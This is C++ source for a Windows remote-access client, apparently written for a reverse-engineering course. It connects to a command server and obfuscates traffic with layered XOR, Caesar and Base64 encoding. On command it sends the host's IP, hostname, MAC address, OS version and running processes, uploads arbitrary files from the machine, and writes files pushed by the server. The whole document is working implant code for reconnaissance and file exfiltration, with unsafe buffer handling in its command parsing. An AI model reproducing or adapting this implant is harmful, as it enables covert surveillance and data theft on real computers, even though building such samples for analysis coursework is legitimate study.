#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define UNICODE

#include <winsock2.h>
#include <Windows.h>
#include <Tlhelp32.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <string.h>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <vector>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <IcmpAPI.h>
#include <functional>
#include <iomanip>
#include <sstream>
#include <VersionHelpers.h>
#include <Psapi.h>
#include <locale>
#include <tchar.h>
#include <algorithm>
#include <cctype>
#include <cmath>

#pragma comment(lib, "WS2_32")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace std;

// Caesar Cipher
int caesar_shift = 3;

// XOR Encryption
string key1 = "csec476";
string key2 = "reversingproject";

// Base64 characters
static const string BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode functions ...
string xor_encrypt(const string input, const string key) {
    string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ key[i % key.size()];
    }
    return output;
}

string caesar_encrypt(const string input) {
    string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        if (isalpha(input[i])) {
            int offset = isupper(input[i]) ? 'A' : 'a';
            output[i] = (input[i] - offset + caesar_shift) % 26 + offset;
        }
        else {
            output[i] = input[i];
        }
    }
    return output;
}

string caesar_decrypt(const string input) {
    string output;
    output.resize(input.size());
    for (size_t i = 0; i < input.size(); ++i) {
        if (isalpha(input[i])) {
            int offset = isupper(input[i]) ? 'A' : 'a';
            output[i] = (input[i] - offset - caesar_shift + 26) % 26 + offset;
        }
        else {
            output[i] = input[i];
        }
    }
    return output;
}

string base64_encode(const string input) {
    string output;
    int val = 0;
    int valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            output.push_back(BASE64_CHARS[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        output.push_back(BASE64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (output.size() % 4) {
        output.push_back('=');
    }
    return output;
}

string base64_decode(const string input) {
    string output;
    vector<int> T(256, -1);
    for (size_t i = 0; i < BASE64_CHARS.size(); i++) {
        T[BASE64_CHARS[i]] = i;
    }

    int val = 0;
    int valb = -8;
    for (unsigned char c : input) {
        if (T[c] == -1) {
            break;
        }
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            output.push_back(static_cast<char>((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return output;
}

// Encode Decode Comb
string encrypt(const string input) {
    // Step 1: XOR
    string xor_encrypted = xor_encrypt(input, key1);

    // Step 2: Caesar Cipher
    string caesar_encrypted = caesar_encrypt(xor_encrypted);

    // Step 3: Base64
    string base64_encoded = base64_encode(caesar_encrypted);

    // Step 4: XOR again
    string final_encrypted = xor_encrypt(base64_encoded, key2);

    return final_encrypted;
}

string decrypt(const string input) {
    // Step 1: XOR
    string xor_decrypted = xor_encrypt(input, key2);

    // Step 2: Base64
    string base64_decoded = base64_decode(xor_decrypted);

    // Step 3: Caesar Cipher
    string caesar_decrypted = caesar_decrypt(base64_decoded);

    // Step 4: XOR again
    string final_decrypted = xor_encrypt(caesar_decrypted, key1);

    return final_decrypted;
}

using namespace std;

//This function can be copy and pasted into the server file 
void upload(SOCKET clientSocket, const char* filePath)
{
    ifstream file(filePath);
    if (!file.is_open())
    {
        cerr << "Failed to open file: " << filePath << endl;
        string encryptedContents = encrypt("Failed to open file");
        int bytesSent = send(clientSocket, encryptedContents.c_str(), encryptedContents.length(), 0);
        return;
    }

    // Read the contents of the text file into a string
    string fileContents((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    cout << "file contents in upload: " << fileContents << endl;

    string encryptedContents = encrypt(fileContents);
    // Send the text file contents to the server
    int bytesSent = send(clientSocket, encryptedContents.c_str(), encryptedContents.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        cerr << "Failed to send data to server: " << WSAGetLastError() << endl;
        return;
    }
}

//This function can be copy and pasted into the server file 
void download(SOCKET clientSocket, const char* filePath, char contents[120])
{
    // Open the file for writing in binary mode
    ofstream outFile(filePath, ios::out | ios::binary);
    if (!outFile.is_open())
    {
        char errorMsg[256];
        cerr << "Failed to open output file: " << strerror_s(errorMsg, sizeof(errorMsg), errno) << endl;
        return;
    }
    
    if (strlen(contents) > 0)
    {
        outFile.write(contents, strlen(contents));
    }
    else
    {
        cerr << "Failed to receive data from server: " << WSAGetLastError() << endl;
        outFile.close();
        return;
    }
    string response = encrypt("File successfully added to server!");
    int bytesSent = send(clientSocket, response.c_str(), sizeof(response), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        cerr << "Failed to send data to server: " << WSAGetLastError() << endl;
        return;
    }
    // Print a message indicating success
    cout << "File received and saved to: " << filePath << endl;

    // Cleanup
    outFile.close();
    return;
}

void getComputerName() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(hostname) / sizeof(char);

    if (GetComputerNameA(hostname, &size)) {
        cout << "Hostname: " << hostname << endl;
    }
    else {
        cout << "Could not get hostname, error: " << GetLastError << endl;
    }
}

string getIpAddress()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        cerr << "Failed to initialize Winsock" << endl;
        return "";
    }

    char hostname[NI_MAXHOST];
    if (gethostname(hostname, NI_MAXHOST) != 0)
    {
        cerr << "Failed to get hostname" << endl;
        return "";
    }

    addrinfo* result;
    addrinfo hints = {};
    hints.ai_family = AF_INET;

    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
    {
        cerr << "Failed to get address info, error code: " << WSAGetLastError() << endl;
        return "";
    }

    sockaddr_in* sockAddr = (sockaddr_in*)result->ai_addr;
    char buffer[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(sockAddr->sin_addr), buffer, INET_ADDRSTRLEN);

    freeaddrinfo(result);
    return buffer;
}

string getMacAddress()
{
    IP_ADAPTER_INFO adapterInfo[16];
    ULONG bufferSize = sizeof(adapterInfo);
    DWORD result = GetAdaptersInfo(adapterInfo, &bufferSize);
    if (result != ERROR_SUCCESS)
    {
        cerr << "Failed to get adapter info, error code: " << result << endl;
        return "";
    }

    PIP_ADAPTER_INFO adapter = adapterInfo;
    vector<unsigned char> macAddress;
    for (size_t i = 0; i < adapter->AddressLength; i++)
    {
        macAddress.push_back(adapter->Address[i]);
    }

    ostringstream oss;
    oss << hex << setfill('0');
    for (auto byte : macAddress)
    {
        oss << setw(2) << static_cast<int>(byte) << ":";
    }
    string macAddressStr = oss.str();
    macAddressStr.pop_back();

    return macAddressStr;
}

string getOS()
{
    if (IsWindows10OrGreater())
    {
        return "Windows 10";
    }
    else if (IsWindows8Point1OrGreater())
    {
        return "Windows 8.1";
    }
    else if (IsWindows8OrGreater())
    {
        return "Windows 8";
    }
    else if (IsWindows7OrGreater())
    {
        return "Windows 7";
    }
    else if (IsWindowsVistaOrGreater())
    {
        return "Windows Vista";
    }
    else if (IsWindowsServer())
    {
        return "Windows Server";
    }
    else if (IsWindowsXPOrGreater())
    {
        return "Windows XP";
    }
    else
    {
        return "Unknown OS";
    }
}

void sendRunningProcesses(SOCKET clientSocket) {
    PROCESSENTRY32 processEntry;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    string processList;

    if (snapshot == INVALID_HANDLE_VALUE) {
        cout << "CreateToolhelp32Snapshot failed" << endl;
        return;
    }

    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &processEntry)) {
        cout << "Process32First failed" << endl;
        CloseHandle(snapshot);
        return;
    }

    do {
        char exeName[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, processEntry.szExeFile, -1, exeName, MAX_PATH, NULL, NULL);
        processList.append(exeName);
        processList.append("\n");
        
    } while (Process32Next(snapshot, &processEntry));

    CloseHandle(snapshot);
    string encryptedProcesses = encrypt(processList);
    int bytesSent = send(clientSocket, encryptedProcesses.c_str(), processList.length(), 0);
    if (bytesSent == SOCKET_ERROR) {
        cout << "Process List send failed" << endl;
        return;
    }
}


int main(int argc, char* arg[]) {

    //Setting up DLL

    SOCKET clientSocket;
    int port = 8080;
    WSADATA wsaData;
    int wsaerr;
    int resultInt;
    string serverAddress = "127.0.0.1";
    string uploadPath = "C:\\Users\\student\\Desktop\\example.txt";
    string downloadPath = "C:\\Users\\student\\Desktop\\downloaded.txt";

    WORD wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    if (wsaerr != 0) {
        cout << "The Winsock dll was not found" << endl;
        return 0;
    }
    else {
        cout << "The Winsock dll was found!" << endl;
        cout << "The status" << wsaData.szSystemStatus << endl;
    }

    //Setting up the client socket

    clientSocket = INVALID_SOCKET;
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Error at socket: " << WSAGetLastError() << endl;
        WSACleanup();
        return 0;
    }
    else {
        cout << "Socket() is working..." << endl;
    }

    //Connecting to the server
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &clientService.sin_addr.s_addr);
    clientService.sin_port = htons(port);
    if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
        cout << "Error at connect(): Failed to connect" << endl;
        WSACleanup();
        return 0;
    }
    else {
        cout << "Client connection is working!" << endl;
        cout << "The client can now start to send and recieve data from the server..." << endl;

    }

    //Get command from the server  
    //Commands:
    //  IPADDRESS
    //  USERNAME
    //  MACADDRESS
    //  OS VERSION
    //  RUNNING PROCESSES
    //  UPLOAD
    //  DOWNLOAD
    for (;;) {
        char buffer[2048];
        //Receive command from server    
        int byteCount = recv(clientSocket, buffer, 2048, 0);

        if (byteCount > 0) {
            //Convert buffer to a readable string to compare inside the if statements
            //string str(buffer); // buffer is already a char array - will otherwise be encoded incorrectly
            printf("\nencrypted received command: %s\n", buffer);
            
            string decryptedBuff = decrypt(string(buffer));
            strncpy(buffer, decryptedBuff.c_str(), decryptedBuff.size());
            buffer[decryptedBuff.size()] = '\0';
            printf("\nreceived command: %s\n", buffer);

            if (strstr(buffer, "IPADDRESS")) {
                //Send IP Address
                string ipAddress = getIpAddress();
                if (ipAddress != "") {
                    // const char* msg = ipAddress.c_str();
                    // int bytesSent = send(clientSocket, msg, strlen(msg), 0);
                    
                    // encode ip
                    string encryptedIpAddress = encrypt(ipAddress);
                    int bytesSent = send(clientSocket,encryptedIpAddress.c_str(), encryptedIpAddress.size(), 0);
                    
                    if (bytesSent == SOCKET_ERROR) {
                        cout << "Error at send(): " << WSAGetLastError() << endl;
                        WSACleanup();
                        return 0;
                    }
                    else {
                        cout << "Message sent to server: " << encryptedIpAddress << endl;
                    }
                }
            }
            else if (strstr(buffer, "USERNAME")) {
                //Send Hostname

                char hostname[MAX_COMPUTERNAME_LENGTH + 1];
                DWORD size = sizeof(hostname) / sizeof(char);

                if (GetComputerNameA(hostname, &size)) {
                    // cout << "Message sent to server: " << hostname << endl;
                    // send(clientSocket, hostname, strlen(hostname), 0);
                    
                    // encode hostname
                    string encryptedHostname = encrypt(string(hostname));
                    int bytesSent = send(clientSocket, encryptedHostname.c_str(), encryptedHostname.size(), 0);
                }
                else {
                    cout << "Could not send hostname. Error: " << GetLastError << endl;
                }
            }
            else if (strstr(buffer, "MACADDRESS")) {
                //Send MAC Address

                string MacAddress = getMacAddress();
                if (MacAddress != "") {
                    // const char* macmsg = MacAddress.c_str();
                    // int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
                    
                    // encode mac
                    string encryptedMacAddress = encrypt(MacAddress);
                    int bytesSent = send(clientSocket, encryptedMacAddress.c_str(), encryptedMacAddress.size(), 0);
                    
                    if (bytesSent == SOCKET_ERROR) {
                        cout << "Error at send(): " << WSAGetLastError() << endl;
                        WSACleanup();
                        return 0;
                    }
                    else {
                        cout << "Message sent to server: " << endl;// << macmsg << endl;
                    }
                }
            }
            else if (strstr(buffer, "OS VERSION")) {
                //Send OS Version

                string osMessage = getOS();
                // int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
                
                // encode os
                string encryptedOsMessage = encrypt(osMessage);
                int bytesSent = send(clientSocket, encryptedOsMessage.c_str(), encryptedOsMessage.size() + 1, 0);
                
                if (bytesSent == SOCKET_ERROR) {
                    cout << "Error while sending OS: " << WSAGetLastError() << endl;
                }
                else {
                    cout << "Message sent to server: " << osMessage << endl;
                }
            }
            else if (strstr(buffer, "RUNNING PROCESSES")) {
                //Send Running Processes
                sendRunningProcesses(clientSocket);
            }
            else if (strstr(buffer, "UPLOAD")) {
                char* tokenA = strtok(buffer, " ");
                tokenA = strtok(NULL, " "); // upload from path
                char path[100];
                strcpy(path, tokenA);
                //path[strlen(path)-1] = '\0';
                cout << "filename uploading from: " << path << endl;
                upload(clientSocket, path);
                //upload(clientSocket, "C:\\Users\\student\\Desktop\\test.txt"); 
            }
            else if (strstr(buffer, "DOWNLOAD")) {
                char before[512];
                strncpy(before, buffer, sizeof(buffer));
                char* token = strtok(before, "\n");
                token = strtok(NULL, "\n");
                char contents[1024];
                strcpy(contents, token);
                char* tokenA = strtok(before, " ");
                tokenA = strtok(NULL, " "); // download from path
                tokenA = strtok(NULL, " "); // download to path
                char path[100];
                strcpy(path, tokenA);
                // contents[strlen(contents)-1] = '\0';
                
                cout << " file download to: " << path << endl;
                cout << " file contents: " << contents << endl;
                // path[strlen(path)-1] = '\0';
                download(clientSocket, path, contents);
                // download(clientSocket, "C:\\Users\\student\\Desktop\\client_downloaded.txt", contents);
            }
            else if (strstr(buffer, "EXIT")) {
                WSACleanup();
                return 0;
            }
            byteCount = 0;
        }
        else {
            WSACleanup();
        }
    }
    //Close the socket
    system("pause");
    WSACleanup();
    return 0;
}
